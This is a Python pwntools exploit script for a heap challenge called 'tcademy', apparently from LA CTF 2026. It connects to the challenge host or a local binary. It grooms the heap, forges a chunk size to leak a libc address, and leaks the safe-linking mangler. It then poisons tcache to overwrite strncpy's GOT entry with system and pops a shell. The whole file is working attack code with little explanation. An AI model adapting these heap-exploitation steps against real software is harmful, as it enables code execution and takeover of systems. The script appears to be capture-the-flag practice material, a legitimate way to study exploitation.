#!/usr/bin/env python3
from pwn import *

TARGET_PATH = os.path.realpath("/ctf-writeups/2026/la-ctf/pwn/tcademy/dist/chall")
LIBC_PATH = os.path.realpath("/lib/x86_64-linux-gnu/libc.so.6")
MAIN_ARENA_OFFSET = 0x21ACE0

elf = context.binary = ELF(TARGET_PATH)
libc = ELF(LIBC_PATH)

context.update(log_level="debug", terminal=["tmux", "split-window", "-h"])


def get_stream():
    if "remote" in sys.argv:
        return remote("chall.lac.tf", 31144)

    return process(TARGET_PATH)


def attach_gdb(r):
    if "debug" in sys.argv:
        bkps = []
        cmds = []

        gdbscript = ["break {}".format(x) for x in bkps] + cmds
        gdb.attach(r, "\n".join(gdbscript))


def create_note(r, idx, size, data):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", f"{idx}".encode())
    r.sendlineafter(b": ", f"{size}".encode())
    r.sendafter(b": ", data)


def delete_note(r, idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", f"{idx}".encode())


def print_note(r, idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", f"{idx}".encode())


def exploit(r):
    # 1. Heap Feng Shui
    for i in range(0x10, 0x90, 0x10):
        create_note(r, 0, i, b"A")
        create_note(r, 1, i, b"A")
        delete_note(r, 1)
        delete_note(r, 0)

    create_note(r, 0, 0, b"A")
    create_note(r, 1, 0, b"A")
    delete_note(r, 0)
    create_note(r, 0, 0, b"A" * 0x18 + p16(0x4D1))
    delete_note(r, 1)

    # 2. Leak Libc Address
    delete_note(r, 0)
    create_note(r, 0, 0, b"A" * 0x20)
    print_note(r, 0)

    r.recvuntil(b"A" * 0x20)
    main_arena = u64(r.recvline().rstrip().ljust(8, b"\0"))
    libc.address = main_arena - MAIN_ARENA_OFFSET

    # 3. Leak Heap Mangler
    delete_note(r, 0)
    create_note(r, 0, 0, b"A" * 0x70)
    print_note(r, 0)
    r.recvuntil(b"A" * 0x70)
    mangler = u64(r.recvline().rstrip().ljust(8, b"\0"))

    # 4. Tcache Poisoning
    target = mangler ^ libc.got.strncpy
    payload = flat(b"A" * 0x18, p64(0x4D1), b"A" * 0x18, p64(0x31), p64(target))

    delete_note(r, 0)
    create_note(r, 0, 0, payload)
    delete_note(r, 0)
    create_note(r, 0, 0x20, b"/bin/sh\0")
    create_note(r, 1, 0x20, p64(libc.sym.strncpy) + p64(libc.sym.system))
    print_note(r, 0)
    r.interactive()


def main():
    r = get_stream()
    attach_gdb(r)
    exploit(r)


if __name__ == "__main__":
    main()
